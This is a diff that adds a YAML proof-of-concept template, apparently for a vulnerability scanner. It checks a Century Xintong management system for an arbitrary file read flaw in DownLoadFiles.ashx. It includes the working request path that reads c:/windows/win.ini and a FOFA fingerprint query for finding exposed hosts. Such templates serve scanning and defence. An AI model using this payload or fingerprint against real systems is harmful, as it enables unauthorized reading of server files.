@@ -1,0 +1,24 @@
+id: poc-yaml-century-ict-downloadfiles-ashx-anyfile-read
+info:
+  name: 世纪信通管理系统 DownLoadFiles.ashx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 世纪信通管理系统
+  fofa: body="广东世纪信通网络科技有限公司" || "theme/BlueCharm/"
+requests:
+- method: GET
+  path: /WeChatConfig/ashx/DownLoadFiles.ashx?filePath=c:/windows/win.ini
+  expression: 'status_code == 200 &&
+
+    contains(body,"; for 16-bit app support") &&
+
+    contains(body,"[files]") &&
+
+    contains(headers,"filename=win.ini") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
